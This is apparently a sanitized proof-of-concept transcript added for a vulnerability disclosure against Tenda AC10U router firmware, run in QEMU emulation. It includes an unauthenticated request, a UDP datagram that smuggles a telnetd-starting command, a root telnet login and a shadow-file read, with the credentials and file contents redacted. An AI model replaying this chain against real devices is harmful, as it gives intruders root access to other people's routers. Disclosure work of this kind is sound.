@@ -1,0 +1,35 @@
+C-1 full-chain transcript (SANITIZED)
+=====================================
+
+Target     : Tenda AC10U V1.0, firmware V15.03.06.48_multi_TDE01
+Environment: QEMU user-mode (qemu-mipsel-static) + chroot over the extracted rootfs
+Precondition: factory/reset state, sys.userpass empty
+
+[1] GET /goform/ate
+    -> HTTP 200
+    (unauthenticated; R7WebsSecurityHandler@0x434e80 takes the !g_Pass[0] branch)
+
+[2] UDP 7329 <- ifconfig ;/usr/sbin/telnetd -b <lan_ip>;#
+    -> response: success
+
+[3] TCP <lan_ip>:23
+    -> LISTEN
+
+[4] telnet <lan_ip> 23
+    login:    root
+    password: <redacted: belongs to a separate hard-coded-credential finding>
+
+    ~ # id
+    uid=0(root) gid=0(root)
+
+[5] ~ # cat /etc_ro/shadow
+    <redacted: root-only file readable; content omitted>
+
+Notes
+-----
+- The injected command is a single UDP datagram; no persistent configuration
+  change was made.
+- The credential used in step 4 is not part of this finding (CWE-78 command
+  injection) and is redacted.
+- The unredacted transcript is available privately to the CNA or vendor on
+  request.
